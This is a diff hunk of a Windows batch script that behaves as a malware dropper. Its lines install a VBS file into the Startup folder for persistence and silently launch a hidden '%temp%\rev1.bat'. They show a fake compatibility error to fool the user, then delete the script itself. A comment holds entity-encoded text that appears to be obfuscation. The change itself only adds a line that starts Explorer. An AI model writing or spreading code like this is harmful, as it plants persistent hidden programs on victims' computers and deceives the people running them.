@@ -50,5 +50,6 @@ move "%temp%\start.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
 @REM @REM ;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x65;&#x63;&#x68;&#x6f;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x74;&#x75;
 powershell -c "Start-Process -FilePath "%temp%\rev1.bat" -WindowStyle Hidden"
 echo The version of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) version of the program ........
+start explorer.exe
 timeout /t 3 >nul
 del "%~f0"
